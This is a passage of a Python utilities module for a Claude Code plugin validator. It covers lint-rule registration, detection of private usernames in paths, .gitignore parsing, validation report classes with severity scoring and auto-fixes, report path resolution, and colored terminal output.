            "Bounded commands (head -n N, grep -c, --short, --porcelain | head) are fine",
            "WARNING-tier output: only emit when an unbounded pattern is the entire script body",
        ),
    )
)

register_rule(
    RuleSchema(
        rule_id="CA-06",
        name="Fork safety — compaction & subagent calls preserve prefix",
        category="cache",
        severity="WARNING",
        description=(
            "PreCompact / PostCompact / SubagentStart hooks must preserve the parent's "
            "system-prompt + tool-schema prefix when forking — otherwise compaction "
            "loses the cached prefix entirely."
        ),
        references=("ussumant/cache-audit Rule 6",),
        fp_guards=(
            "Most plugins don't ship compaction hooks — silent PASS is the norm",
            "Built-in Claude Code compaction is correct by default",
        ),
    )
)


# Private usernames to detect - automatically detected from system
# These should never appear in published code
def _get_private_usernames() -> set[str]:
    """Auto-detect private usernames from the current system.

    Detection sources (in order):
    1. CLAUDE_PRIVATE_USERNAMES env var (comma-separated, set by agent)
    2. getpass.getuser() - current login name
    3. Path.home().name - home directory name
    4. USER, USERNAME, LOGNAME env vars
    """
    usernames: set[str] = set()

    # First check if explicitly provided via env var (from agent)
    explicit = os.environ.get("CLAUDE_PRIVATE_USERNAMES", "").strip()
    if explicit:
        for u in explicit.split(","):
            u = u.strip().lower()
            if u and u not in EXAMPLE_USERNAMES:
                usernames.add(u)

    # Get current user's login name
    try:
        username = getpass.getuser().lower()
        if username and username not in EXAMPLE_USERNAMES:
            usernames.add(username)
    except Exception:
        pass

    # Get username from home directory path
    try:
        home = Path.home()
        if home.name and home.name.lower() not in EXAMPLE_USERNAMES:
            usernames.add(home.name.lower())
    except Exception:
        pass

    # Also check environment variables
    for var in ("USER", "USERNAME", "LOGNAME"):
        val = os.environ.get(var, "").strip().lower()
        if val and val not in EXAMPLE_USERNAMES:
            usernames.add(val)

    return usernames


# Auto-detect at import time
PRIVATE_USERNAMES: set[str] = _get_private_usernames()


# Patterns for detecting private paths with actual usernames
# More specific than USER_PATH_PATTERNS - these flag as CRITICAL
def build_private_path_patterns(usernames: set[str]) -> list[tuple[re.Pattern[str], str]]:
    """Build regex patterns for detecting private usernames in paths.

    Args:
        usernames: Set of private usernames to detect

    Returns:
        List of (pattern, description) tuples
    """
    patterns: list[tuple[re.Pattern[str], str]] = []
    for username in usernames:
        # Case-insensitive match for username in paths
        escaped = re.escape(username)
        patterns.extend(
            [
                (
                    re.compile(rf"/Users/{escaped}(/|$)", re.IGNORECASE),
                    f"macOS private path with username '{username}'",
                ),
                (re.compile(rf"/home/{escaped}(/|$)", re.IGNORECASE), f"Linux private path with username '{username}'"),
                (
                    re.compile(rf"C:\\Users\\{escaped}(\\|$)", re.IGNORECASE),
                    f"Windows private path with username '{username}'",
                ),
                (
                    re.compile(rf"C:/Users/{escaped}(/|$)", re.IGNORECASE),
                    f"Windows private path with username '{username}'",
                ),
                # Also catch username alone in suspicious contexts
                (re.compile(rf"(?<=/){escaped}(?=/)", re.IGNORECASE), f"username '{username}' in path"),
            ]
        )
    return patterns


# Pre-built patterns for default usernames
PRIVATE_PATH_PATTERNS = build_private_path_patterns(PRIVATE_USERNAMES)

# File extensions to check for private info
SCANNABLE_EXTENSIONS = {
    ".json",
    ".yml",
    ".yaml",
    ".md",
    ".py",
    ".sh",
    ".txt",
    ".toml",
    ".js",
    ".ts",
    ".jsx",
    ".tsx",
    ".html",
    ".css",
    ".xml",
    ".ini",
    ".cfg",
    ".conf",
    ".env",
    ".gitignore",
    ".gitmodules",
}

# Directories to skip when scanning for private info
PRIVATE_INFO_SKIP_DIRS = {
    ".git",
    ".mypy_cache",
    ".ruff_cache",
    "__pycache__",
    ".venv",
    "venv",
    "node_modules",
    ".pytest_cache",
    ".tox",
    "dist",
    "build",
    "target",
    ".eggs",
    "*.egg-info",
    # Also skip dev folders that aren't published
    "docs_dev",
    "scripts_dev",
    "tests_dev",
    "examples_dev",
    "samples_dev",
    "downloads_dev",
    "libs_dev",
    "builds_dev",
}


# =============================================================================
# Gitignore Support
# =============================================================================


def get_gitignored_files(root_path: Path) -> set[str]:
    """Get set of files/directories that are gitignored.

    Uses git check-ignore to accurately determine what's ignored,
    falling back to parsing .gitignore directly if git is not available.

    Args:
        root_path: Root directory to check for .gitignore

    Returns:
        Set of relative paths that are gitignored
    """
    ignored: set[str] = set()

    # Try using git check-ignore for accuracy (respects .gitignore hierarchy)
    try:
        result = subprocess.run(
            ["git", "ls-files", "--ignored", "--exclude-standard", "--others", "--directory"],
            cwd=root_path,
            capture_output=True,
            text=True,
            timeout=30,
        )
        if result.returncode == 0:
            for line in result.stdout.strip().split("\n"):
                if line:
                    ignored.add(line.rstrip("/"))
            return ignored
    except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
        pass

    # Fallback: Parse .gitignore directly
    gitignore_path = root_path / ".gitignore"
    if gitignore_path.exists():
        try:
            patterns = parse_gitignore(gitignore_path)
            # Scan directory and match patterns
            for dirpath, dirnames, filenames in os.walk(root_path):
                rel_dir = Path(dirpath).relative_to(root_path)
                for name in dirnames + filenames:
                    rel_path = str(rel_dir / name) if str(rel_dir) != "." else name
                    if is_path_gitignored(rel_path, patterns):
                        ignored.add(rel_path)
        except Exception:
            pass

    return ignored


def parse_gitignore(gitignore_path: Path) -> list[str]:
    """Parse a .gitignore file and return list of patterns.

    Args:
        gitignore_path: Path to .gitignore file

    Returns:
        List of gitignore patterns (comments and empty lines stripped)
    """
    patterns: list[str] = []
    try:
        with open(gitignore_path, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                # Skip empty lines and comments
                if not line or line.startswith("#"):
                    continue
                patterns.append(line)
    except (OSError, UnicodeDecodeError):
        pass
    return patterns


def is_path_gitignored(rel_path: str, patterns: list[str]) -> bool:
    """Check if a relative path matches any gitignore pattern.

    Args:
        rel_path: Relative path to check
        patterns: List of gitignore patterns

    Returns:
        True if path matches any pattern
    """
    # Normalize path separators
    rel_path = rel_path.replace("\\", "/")
    path_parts = rel_path.split("/")

    for pattern in patterns:
        # Handle negation (!) - un-ignore previously matched paths
        if pattern.startswith("!"):
            neg_pattern = pattern[1:]
            # If the path matches the negation pattern, it should NOT be ignored
            if fnmatch.fnmatch(rel_path, neg_pattern) or fnmatch.fnmatch(str(Path(rel_path).name), neg_pattern):
                return False
            continue

        # Handle directory-only patterns (ending with /)
        is_dir_pattern = pattern.endswith("/")
        if is_dir_pattern:
            pattern = pattern[:-1]

        # Handle patterns starting with /
        is_anchored = pattern.startswith("/")
        if is_anchored:
            pattern = pattern[1:]

        # Handle ** patterns properly for recursive directory matching
        if "**" in pattern:
            if pattern.startswith("**/"):
                # **/foo matches foo at any depth
                suffix = pattern[3:]  # e.g., "dist" from "**/dist"
                if (
                    fnmatch.fnmatch(rel_path, suffix)
                    or fnmatch.fnmatch(rel_path, f"*/{suffix}")
                    or f"/{suffix}" in f"/{rel_path}"
                ):
                    return True
                continue
            elif pattern.endswith("/**"):
                # build/** matches any file under the prefix directory
                prefix = pattern[:-3]  # e.g., "build" from "build/**"
                if rel_path.startswith(prefix + "/") or rel_path == prefix:
                    return True
                continue
            else:
                # General ** — replace with regex-like matching
                regex = pattern.replace(".", r"\.").replace("**", ".*").replace("*", "[^/]*").replace("?", "[^/]")
                if re.match(regex + "$", rel_path):
                    return True
                continue

        # Check if pattern matches any component or the full path
        if is_anchored:
            # Anchored patterns only match from root
            if fnmatch.fnmatch(rel_path, pattern):
                return True
        else:
            # Non-anchored patterns can match any component
            if fnmatch.fnmatch(rel_path, pattern):
                return True
            # Also check if any path component matches
            for part in path_parts:
                if fnmatch.fnmatch(part, pattern):
                    return True

    return False


def get_gitignore_filter(plugin_root: Path):  # noqa: ANN201
    """Create a GitignoreFilter for the given plugin root.

    Returns a GitignoreFilter instance that respects .gitignore patterns.
    All validators should use this instead of hardcoded skip lists.

    Usage:
        gi = get_gitignore_filter(plugin_root)
        for dirpath, dirnames, filenames in gi.walk():
            ...
        for path in gi.rglob("*.py"):
            ...
    """
    from gitignore_filter import GitignoreFilter

    return GitignoreFilter(plugin_root)


def get_skip_dirs_with_gitignore(root_path: Path, additional_skip: set[str] | None = None) -> set[str]:
    """Get combined set of directories to skip (built-in + gitignored).

    Args:
        root_path: Root directory to check for .gitignore
        additional_skip: Additional directories to skip

    Returns:
        Combined set of directory names to skip
    """
    dirs_to_skip = set(PRIVATE_INFO_SKIP_DIRS)
    if additional_skip:
        dirs_to_skip.update(additional_skip)

    # Add gitignored directories
    gitignored = get_gitignored_files(root_path)
    for path in gitignored:
        # Add both the full path and just the directory name
        dirs_to_skip.add(path)
        if "/" in path:
            dirs_to_skip.add(path.split("/")[-1])

    return dirs_to_skip


# =============================================================================
# Validation Name Patterns
# =============================================================================

# Name validation pattern (kebab-case)
NAME_PATTERN = re.compile(r"^[a-z][a-z0-9]*(-[a-z0-9]+)*$")

# Maximum recommended values for names and descriptions
MAX_NAME_LENGTH = 64  # Official Claude Code spec: max 64 characters for skill/component names
MAX_DESCRIPTION_LENGTH = 1024
MIN_BODY_CHARS = 100
MAX_BODY_WORDS = 2000

# =============================================================================
# Shared Naming Validation
# =============================================================================


def validate_component_name(
    name: str,
    component_type: str,
    report: "ValidationReport",
    *,
    directory_name: str | None = None,
) -> None:
    """Validate a component name against uniform naming rules.

    Enforces consistent naming across all component types (plugin, skill, agent,
    command, mcp-server, marketplace-plugin, reference-file):
    - Must start with a lowercase letter
    - May end with a letter or digit
    - Only lowercase letters, digits, and single hyphens allowed
    - No consecutive hyphens, no underscores, no uppercase
    - Max length: MAX_NAME_LENGTH (64) chars
    - For skills: frontmatter name must match directory name

    Args:
        name: The component name to validate.
        component_type: Human-readable type label for error messages.
        report: ValidationReport to accumulate results into.
        directory_name: If provided, name must match this (for skill dir-name check).
    """
    if not name:
        report.add("CRITICAL", f"{component_type} name is empty")
        return
    # Length check
    if len(name) > MAX_NAME_LENGTH:
        report.add("MAJOR", f"{component_type} name '{name}' exceeds {MAX_NAME_LENGTH} chars ({len(name)})")
    # Pattern check: NAME_PATTERN validates structure (start with letter, kebab-case, no --)
    if not NAME_PATTERN.match(name):
        # Provide specific diagnostic message
        if name[0].isdigit():
            report.add("CRITICAL", f"{component_type} name '{name}' must not start with a digit")
        elif "--" in name:
            report.add("CRITICAL", f"{component_type} name '{name}' contains consecutive hyphens")
        elif "_" in name:
            report.add("CRITICAL", f"{component_type} name '{name}' contains underscore (use hyphen)")
        elif any(c.isupper() for c in name):
            report.add("CRITICAL", f"{component_type} name '{name}' contains uppercase (use lowercase)")
        else:
            report.add(
                "CRITICAL",
                f"{component_type} name '{name}' does not match naming pattern (lowercase letters, digits, hyphens; must start with letter)",
            )
    # Directory name match (for skills: frontmatter name must equal directory name)
    if directory_name is not None and name != directory_name:
        report.add("MAJOR", f"{component_type} frontmatter name '{name}' must match directory name '{directory_name}'")


# =============================================================================
# Data Classes
# =============================================================================


@dataclass
class ValidationResult:
    """Single validation check result.

    Attributes:
        level: Severity level (CRITICAL, MAJOR, MINOR, INFO, PASSED)
        message: Human-readable description of the result
        file: Optional file path related to the result
        line: Optional line number in the file
        phase: Optional validation phase (structure, semantic, security, cross-reference)
        fixable: Whether this issue can be auto-fixed
        fix_id: Identifier for the fix function (if fixable)
        category: Optional sub-category tag (e.g., "manifest", "architecture", "plugin")
        suggestion: Optional remediation hint shown alongside the message
    """

    level: Level
    message: str
    file: str | None = None
    line: int | None = None
    phase: str | None = None
    fixable: bool = False
    fix_id: str | None = None
    category: str = ""
    suggestion: str | None = None

    def to_dict(self) -> dict[str, str | int | bool | None]:
        """Convert to dictionary for JSON serialization."""
        result: dict[str, str | int | bool | None] = {"level": self.level, "message": self.message}
        if self.file is not None:
            result["file"] = self.file
        if self.line is not None:
            result["line"] = self.line
        if self.phase is not None:
            result["phase"] = self.phase
        if self.fixable:
            result["fixable"] = self.fixable
            if self.fix_id:
                result["fix_id"] = self.fix_id
        if self.category:
            result["category"] = self.category
        if self.suggestion is not None:
            result["suggestion"] = self.suggestion
        return result


# Type alias for fix functions
FixFunction = Callable[[str, int | None], bool]  # (file_path, line) -> success


@dataclass
class FixableIssue:
    """Represents an issue that can be automatically fixed.

    Attributes:
        result: The validation result describing the issue
        fix_func: Function that can fix this issue
        fix_description: Human-readable description of what the fix does
    """

    result: ValidationResult
    fix_func: FixFunction
    fix_description: str

    def apply(self) -> bool:
        """Apply the fix and return success status.

        Returns:
            True if fix was successfully applied, False otherwise
        """
        if not self.result.file:
            return False
        return self.fix_func(self.result.file, self.result.line)


@dataclass
class ValidationReport:
    """Complete validation report with results collection and scoring.

    This is the base class that all validators should use (or extend).
    Provides consistent methods for adding results and computing scores.

    Supports:
    - Error accumulation (collect all errors before reporting)
    - Fixable issues registration and auto-fix application
    - Multi-phase validation tracking
    - Partial validation (return valid items even when some fail)
    """

    results: list[ValidationResult] = field(default_factory=list)
    fixable_issues: list[FixableIssue] = field(default_factory=list)
    valid_items: list[Any] = field(default_factory=list)
    failed_items: list[Any] = field(default_factory=list)

    def add(
        self,
        level: Level,
        message: str,
        file: str | None = None,
        line: int | None = None,
        phase: str | None = None,
        fixable: bool = False,
        fix_id: str | None = None,
    ) -> None:
        """Add a validation result."""
        self.results.append(ValidationResult(level, message, file, line, phase, fixable, fix_id))

    def passed(self, message: str, file: str | None = None) -> None:
        """Add a passed check."""
        self.add("PASSED", message, file)

    def info(self, message: str, file: str | None = None, line: int | None = None) -> None:
        """Add an info message.

        ``line`` is accepted for symmetry with ``warning()`` / ``minor()`` /
        ``nit()`` so callers that demote a finding to INFO via
        ``getattr(report, level)(msg, file, line)`` don't need a special
        case. The line is recorded on the result and rendered in the
        per-finding line whenever present.
        """
        self.add("INFO", message, file, line)

    def warning(self, message: str, file: str | None = None, line: int | None = None) -> None:
        """Add a warning — always reported, never blocks validation (even in --strict)."""
        self.add("WARNING", message, file, line)

    def nit(self, message: str, file: str | None = None, line: int | None = None) -> None:
        """Add a nit — blocks validation only in --strict mode."""
        self.add("NIT", message, file, line)

    def minor(self, message: str, file: str | None = None, line: int | None = None) -> None:
        """Add a minor issue."""
        self.add("MINOR", message, file, line)

    def major(self, message: str, file: str | None = None, line: int | None = None) -> None:
        """Add a major issue."""
        self.add("MAJOR", message, file, line)

    def critical(self, message: str, file: str | None = None, line: int | None = None) -> None:
        """Add a critical issue."""
        self.add("CRITICAL", message, file, line)

    @property
    def has_critical(self) -> bool:
        """Check if any CRITICAL issues exist."""
        return any(r.level == "CRITICAL" for r in self.results)

    @property
    def has_major(self) -> bool:
        """Check if any MAJOR issues exist."""
        return any(r.level == "MAJOR" for r in self.results)

    @property
    def has_minor(self) -> bool:
        """Check if any MINOR issues exist."""
        return any(r.level == "MINOR" for r in self.results)

    @property
    def has_nit(self) -> bool:
        """Check if any NIT issues exist."""
        return any(r.level == "NIT" for r in self.results)

    @property
    def has_warning(self) -> bool:
        """Check if any WARNING issues exist."""
        return any(r.level == "WARNING" for r in self.results)

    @property
    def exit_code(self) -> int:
        """Get appropriate exit code based on highest severity issue.

        NIT and WARNING never affect exit code here.
        NIT blocking is handled by --strict flag in each validator's main().
        WARNING never blocks validation.
        """
        if self.has_critical:
            return EXIT_CRITICAL
        if self.has_major:
            return EXIT_MAJOR
        if self.has_minor:
            return EXIT_MINOR
        return EXIT_OK

    def exit_code_strict(self) -> int:
        """Get exit code for --strict mode (NIT issues also block).

        WARNING still does not block even in strict mode.
        """
        code = self.exit_code
        if code != EXIT_OK:
            return code
        if self.has_nit:
            return EXIT_NIT
        return EXIT_OK

    @property
    def score(self) -> int:
        """Calculate health score (0-100) based on validation results.

        Scoring:
        - Start at 100
        - Deduct 25 for each CRITICAL
        - Deduct 10 for each MAJOR
        - Deduct 3 for each MINOR
        - Deduct 1 for each NIT
        - WARNING, INFO, and PASSED don't affect score
        """
        score = 100
        for r in self.results:
            if r.level == "CRITICAL":
                score -= 25
            elif r.level == "MAJOR":
                score -= 10
            elif r.level == "MINOR":
                score -= 3
            elif r.level == "NIT":
                score -= 1
        return max(0, score)

    def count_by_level(self) -> dict[str, int]:
        """Get count of results by level."""
        counts: dict[str, int] = {"CRITICAL": 0, "MAJOR": 0, "MINOR": 0, "NIT": 0, "WARNING": 0, "INFO": 0, "PASSED": 0}
        for r in self.results:
            counts[r.level] = counts.get(r.level, 0) + 1
        return counts

    def merge(self, other: "ValidationReport") -> None:
        """Merge results from another report into this one."""
        self.results.extend(other.results)

    def to_dict(self) -> dict[str, object]:
        """Convert to dictionary for JSON serialization."""
        counts = self.count_by_level()
        return {
            "score": self.score,
            "score_pct": self.score,
            "exit_code": self.exit_code,
            "counts": counts,
            "results": [r.to_dict() for r in self.results],
            "fixable_count": len(self.fixable_issues),
            "valid_items_count": len(self.valid_items),
            "failed_items_count": len(self.failed_items),
        }

    def to_json(self, indent: int = 2) -> str:
        """Convert report to JSON string.

        Args:
            indent: JSON indentation level (default 2)

        Returns:
            JSON string representation of the report
        """
        return json.dumps(self.to_dict(), indent=indent)

    # =========================================================================
    # Error Accumulation Pattern Methods
    # =========================================================================

    def get_all_errors(self) -> list[ValidationResult]:
        """Get all error results (CRITICAL, MAJOR, MINOR).

        Returns:
            List of all error-level results, excluding INFO and PASSED
        """
        return [r for r in self.results if r.level in ("CRITICAL", "MAJOR", "MINOR")]

    def get_errors_by_level(self, level: Level) -> list[ValidationResult]:
        """Get all results of a specific level.

        Args:
            level: The severity level to filter by

        Returns:
            List of results matching the specified level
        """
        return [r for r in self.results if r.level == level]

    def get_errors_by_phase(self, phase: str) -> list[ValidationResult]:
        """Get all errors from a specific validation phase.

        Args:
            phase: The validation phase to filter by

        Returns:
            List of error results from the specified phase
        """
        return [r for r in self.results if r.phase == phase and r.level in ("CRITICAL", "MAJOR", "MINOR")]

    # =========================================================================
    # Partial Validation Support Methods
    # =========================================================================

    def add_valid_item(self, item: Any) -> None:
        """Add an item that passed validation.

        Args:
            item: The validated item (can be any type)
        """
        self.valid_items.append(item)

    def add_failed_item(self, item: Any) -> None:
        """Add an item that failed validation.

        Args:
            item: The failed item (can be any type)
        """
        self.failed_items.append(item)

    def get_valid_items(self) -> list[Any]:
        """Get list of items that passed validation.

        Returns:
            List of valid items (even if some items failed)
        """
        return self.valid_items

    def get_failed_items(self) -> list[Any]:
        """Get list of items that failed validation.

        Returns:
            List of failed items
        """
        return self.failed_items

    # =========================================================================
    # Fixable Issues Support Methods
    # =========================================================================

    def add_fixable(
        self,
        level: Level,
        message: str,
        fix_func: FixFunction,
        fix_description: str,
        file: str | None = None,
        line: int | None = None,
        phase: str | None = None,
    ) -> None:
        """Add a validation result that can be auto-fixed.

        Args:
            level: Severity level
            message: Human-readable description
            fix_func: Function that fixes this issue
            fix_description: Description of what the fix does
            file: Optional file path
            line: Optional line number
            phase: Optional validation phase
        """
        # Generate a unique fix_id
        fix_id = f"fix_{len(self.fixable_issues)}"

        # Add the result with fixable flag
        result = ValidationResult(
            level=level,
            message=message,
            file=file,
            line=line,
            phase=phase,
            fixable=True,
            fix_id=fix_id,
        )
        self.results.append(result)

        # Register the fixable issue
        fixable = FixableIssue(
            result=result,
            fix_func=fix_func,
            fix_description=fix_description,
        )
        self.fixable_issues.append(fixable)

    def get_fixable_issues(self) -> list[FixableIssue]:
        """Get list of all fixable issues.

        Returns:
            List of FixableIssue objects that can be auto-fixed
        """
        return self.fixable_issues

    def apply_fixes(self, dry_run: bool = False) -> dict[str, int]:
        """Apply all registered auto-fixes.

        Args:
            dry_run: If True, don't actually apply fixes, just count them

        Returns:
            Dictionary with counts: {"applied": N, "failed": M, "skipped": K}
        """
        stats = {"applied": 0, "failed": 0, "skipped": 0}

        for fixable in self.fixable_issues:
            if dry_run:
                stats["skipped"] += 1
                continue

            try:
                success = fixable.apply()
                if success:
                    stats["applied"] += 1
                    # Update the result to PASSED if fix succeeded
                    fixable.result.level = "PASSED"
                    fixable.result.message = f"[FIXED] {fixable.result.message}"
                else:
                    stats["failed"] += 1
            except Exception:
                stats["failed"] += 1

        return stats


@dataclass
class ValidationContext:
    """Context for collecting validation errors without failing fast.

    This class implements the Error Accumulation Pattern, allowing validators
    to collect ALL errors before reporting rather than stopping at the first error.

    Usage:
        ctx = ValidationContext("my-validation")
        ctx.check(condition1, "MAJOR", "Error message 1")
        ctx.check(condition2, "MINOR", "Error message 2")
        report = ctx.finalize()
    """

    name: str
    report: ValidationReport = field(default_factory=ValidationReport)
    current_phase: str | None = None

    def set_phase(self, phase: str) -> None:
        """Set the current validation phase.

        Args:
            phase: Phase name (use PHASE_* constants)
        """
        self.current_phase = phase

    def check(
        self,
        condition: bool,
        level: Level,
        message: str,
        file: str | None = None,
        line: int | None = None,
    ) -> bool:
        """Check a condition and record result.

        Args:
            condition: If True, check passes; if False, adds error
            level: Severity level if check fails
            message: Error message if check fails
            file: Optional file path
            line: Optional line number

        Returns:
            The condition value (True if passed, False if failed)
        """
        if condition:
            self.report.passed(f"[{self.name}] {message}", file)
        else:
            self.report.add(level, f"[{self.name}] {message}", file, line, self.current_phase)
        return condition

    def require(
        self,
        condition: bool,
        message: str,
        file: str | None = None,
        line: int | None = None,
    ) -> bool:
        """Check a required condition (CRITICAL if fails).

        Args:
            condition: If True, check passes; if False, adds CRITICAL error
            message: Error message if check fails
            file: Optional file path
            line: Optional line number

        Returns:
            The condition value
        """
        return self.check(condition, "CRITICAL", message, file, line)

    def validate_item(
        self,
        item: Any,
        validator_func: Callable[[Any], bool],
        item_name: str,
    ) -> bool:
        """Validate an item and track it for partial validation.

        Args:
            item: The item to validate
            validator_func: Function that returns True if valid
            item_name: Name for error messages

        Returns:
            True if item is valid, False otherwise
        """
        try:
            is_valid = validator_func(item)
            if is_valid:
                self.report.add_valid_item(item)
            else:
                self.report.add_failed_item(item)
                self.report.add("MAJOR", f"Validation failed for {item_name}", phase=self.current_phase)
            return is_valid
        except Exception as e:
            self.report.add_failed_item(item)
            self.report.add("CRITICAL", f"Validation error for {item_name}: {e}", phase=self.current_phase)
            return False

    def add_error(
        self,
        level: Level,
        message: str,
        file: str | None = None,
        line: int | None = None,
    ) -> None:
        """Add an error without a condition check.

        Args:
            level: Severity level
            message: Error message
            file: Optional file path
            line: Optional line number
        """
        self.report.add(level, f"[{self.name}] {message}", file, line, self.current_phase)

    def add_fixable(
        self,
        level: Level,
        message: str,
        fix_func: FixFunction,
        fix_description: str,
        file: str | None = None,
        line: int | None = None,
    ) -> None:
        """Add a fixable error.

        Args:
            level: Severity level
            message: Error message
            fix_func: Function to fix this issue
            fix_description: Description of the fix
            file: Optional file path
            line: Optional line number
        """
        self.report.add_fixable(
            level=level,
            message=f"[{self.name}] {message}",
            fix_func=fix_func,
            fix_description=fix_description,
            file=file,
            line=line,
            phase=self.current_phase,
        )

    def finalize(self) -> ValidationReport:
        """Finalize the validation context and return the report.

        Returns:
            The collected ValidationReport with all results
        """
        return self.report

    @property
    def has_errors(self) -> bool:
        """Check if any errors were recorded.

        Returns:
            True if any CRITICAL, MAJOR, or MINOR issues exist
        """
        return bool(self.report.get_all_errors())

    @property
    def error_count(self) -> int:
        """Get total number of errors.

        Returns:
            Count of all error-level results
        """
        return len(self.report.get_all_errors())


# =============================================================================
# Utility Functions
# =============================================================================


def get_plugin_root() -> Path:
    """Get the plugin root directory (parent of scripts/).

    Returns:
        Path to the plugin root, assuming this module lives in scripts/.
    """
    return Path(__file__).resolve().parent.parent


def resolve_project_root(anchor: Path | None = None) -> Path:
    """Resolve the **main-repo root** for the reports-location rule.

    The rule (agent-reports-location.md) requires reports to land under the
    main-repo `./reports/`, even when the caller runs inside a linked
    ``git worktree``. ``git worktree list`` always lists the main worktree
    first, so its first entry is the canonical source of truth.

    Resolution order (matches the canonical shell prologue):

        1. ``CLAUDE_PROJECT_DIR`` env var — Claude Code sets this to the
           user's project directory and never rewrites it when spawning a
           worktree subagent.
        2. First entry of ``git worktree list --porcelain`` — always the
           main worktree, regardless of whether we call it from the main
           checkout or a linked worktree.
        3. ``git rev-parse --show-toplevel`` — fallback for non-worktree
           scenarios or older gits.
        4. The caller's anchor or CWD — fallback when not inside a git repo.

    Args:
        anchor: Optional starting path. Defaults to ``Path.cwd()``.

    Returns:
        Absolute path to the main-repo root.
    """
    env_dir = os.environ.get("CLAUDE_PROJECT_DIR")
    if env_dir:
        p = Path(env_dir).expanduser()
        if p.is_dir():
            return p.resolve()

    start = (anchor or Path.cwd()).resolve()

    try:
        wt = subprocess.run(
            ["git", "worktree", "list", "--porcelain"],
            cwd=str(start),
            capture_output=True,
            text=True,
            check=False,
            timeout=5,
        )
        if wt.returncode == 0:
            for line in wt.stdout.splitlines():
                if line.startswith("worktree "):
                    return Path(line[len("worktree ") :].strip()).resolve()
    except (FileNotFoundError, subprocess.SubprocessError):
        pass

    try:
        top = subprocess.run(
            ["git", "rev-parse", "--show-toplevel"],
            cwd=str(start),
            capture_output=True,
            text=True,
            check=False,
            timeout=5,
        )
        if top.returncode == 0 and top.stdout.strip():
            return Path(top.stdout.strip()).resolve()
    except (FileNotFoundError, subprocess.SubprocessError):
        pass

    return start


def report_timestamp() -> str:
    """Return the canonical local-time+GMT-offset filename timestamp.

    Format: ``YYYYMMDD_HHMMSS±HHMM`` (compact, filesystem-safe on every OS).
    Example: ``20260421_183012+0200``.

    The rule mandates local time (never UTC) with the GMT offset appended
    so humans can tie a report back to their own workday without timezone
    arithmetic, and so ``ls -t`` / glob sorting behave predictably.
    """
    from datetime import datetime

    # astimezone() with no arg uses the local timezone, producing a timezone-aware
    # datetime. strftime("%z") then produces the compact "±HHMM" form.
    return datetime.now().astimezone().strftime("%Y%m%d_%H%M%S%z")


def resolve_reports_dir(
    component: str | None = None,
    anchor: Path | None = None,
    *,
    ensure: bool = True,
) -> Path:
    """Resolve ``$MAIN_ROOT/reports/<component>/`` per the agent-reports rule.

    Every agent, skill, and script that saves a report MUST write into the
    directory returned here. Reports often contain private data (full paths,
    source snippets, validation output, user decisions), so the folder is
    gitignored by convention. Reports from a linked worktree still land in
    the **main** repo's ``reports/`` — never the worktree's own.

    Args:
        component: Per-component subfolder name (agent name, script name,
            skill name). When omitted, returns the top-level ``reports/``
            folder — callers should always pass a component, but the
            legacy form remains supported for one-off ad-hoc writes.
        anchor: Optional starting path; defaults to the current directory.
        ensure: When True (default), create the directory if it does not
            exist.

    Returns:
        Absolute path to the ``reports/<component>/`` (or ``reports/``)
        directory under the main-repo root.
    """
    reports = resolve_project_root(anchor) / "reports"
    if component:
        reports = reports / component
    if ensure:
        reports.mkdir(parents=True, exist_ok=True)
    return reports


def build_report_path(
    component: str,
    slug: str,
    ext: str = "md",
    anchor: Path | None = None,
    *,
    ensure: bool = True,
) -> Path:
    """Return the canonical report path for a new artefact.

    Produces ``$MAIN_ROOT/reports/<component>/<YYYYMMDD_HHMMSS±HHMM>-<slug>.<ext>``
    per the mandatory format in ``~/.claude/rules/agent-reports-location.md``.

    Args:
        component: Per-component subfolder name.
        slug: Short kebab-case summary (e.g. ``release-notes-2.25.0``,
            ``validate-my-plugin``).
        ext: File extension without the leading dot. Defaults to ``md``.
        anchor: Optional starting path; defaults to the current directory.
        ensure: When True (default), ensure the component subfolder exists.

    Returns:
        Absolute path to a fresh report filename — not the file itself,
        the caller is responsible for writing content.
    """
    return resolve_reports_dir(component, anchor, ensure=ensure) / f"{report_timestamp()}-{slug}.{ext}"


def is_valid_kebab_case(name: str) -> bool:
    """Check if name follows kebab-case convention."""
    return bool(NAME_PATTERN.match(name))


# =============================================================================
# Color Formatting (for terminal output)
# =============================================================================

# ANSI color codes — IMMUTABLE. Never mutate this dict at runtime; use
# `set_color_enabled(False)` instead. Mutating the dict is shared-state
# pollution that flares under pytest-xdist parallel workers (one worker's
# `--no-color` validate run clobbers COLORS for every other worker's
# subsequent `colorize()` call in the same process).
COLORS = {
    "CRITICAL": "\033[91m",  # Red
    "MAJOR": "\033[93m",  # Yellow
    "MAJOR_DARK": "\033[33m",  # Dark Yellow
    "MINOR": "\033[94m",  # Blue
    "NIT": "\033[96m",  # Cyan — blocks only in --strict
    "WARNING": "\033[95m",  # Magenta — never blocks, always reported
    "INFO": "\033[90m",  # Gray
    "PASSED": "\033[92m",  # Green
    "RESET": "\033[0m",  # Reset
    "BOLD": "\033[1m",  # Bold
    "DIM": "\033[2m",  # Dim
}

# Color-enabled flag. False → colorize/format_result emit no ANSI codes.
# Set via set_color_enabled() — never mutate COLORS itself.
_COLOR_ENABLED: bool = True


def set_color_enabled(enabled: bool) -> None:
    """Toggle ANSI color output globally for this process.

    Call this from a CLI's main() when --no-color is passed or stdout
    isn't a TTY. Replaces the older "for k in COLORS: COLORS[k] = ''"
    pattern which was shared-state pollution that broke under
    pytest-xdist parallel workers.
    """
    global _COLOR_ENABLED
    _COLOR_ENABLED = bool(enabled)


def colorize(text: str, level: str) -> str:
    """Apply color to text based on level (no-op when colors disabled)."""
    if not _COLOR_ENABLED:
        return text
    color = COLORS.get(level, "")
    return f"{color}{text}{COLORS['RESET']}"


def format_result(result: ValidationResult, show_file: bool = True) -> str:
    """Format a single validation result for terminal output."""
    if _COLOR_ENABLED:
        color = COLORS.get(result.level, "")
        reset = COLORS["RESET"]
    else:
        color = reset = ""

    parts = [f"{color}[{result.level}]{reset} {result.message}"]

    if show_file and result.file:
        location = result.file
        if result.line:
            location += f":{result.line}"
        parts.append(f" ({location})")

    return "".join(parts)


def print_report_summary(report: ValidationReport, title: str = "Validation Report") -> None:
    """Print a formatted summary of a validation report."""
    counts = report.count_by_level()
    score = report.score

    print(f"\n{'=' * 60}")
    print(f"{COLORS['BOLD']}{title}{COLORS['RESET']}")
    print(f"{'=' * 60}")

    # Print counts by level
    print(f"\n{COLORS['CRITICAL']}CRITICAL: {counts['CRITICAL']}{COLORS['RESET']}")
    print(f"{COLORS['MAJOR']}MAJOR:    {counts['MAJOR']}{COLORS['RESET']}")
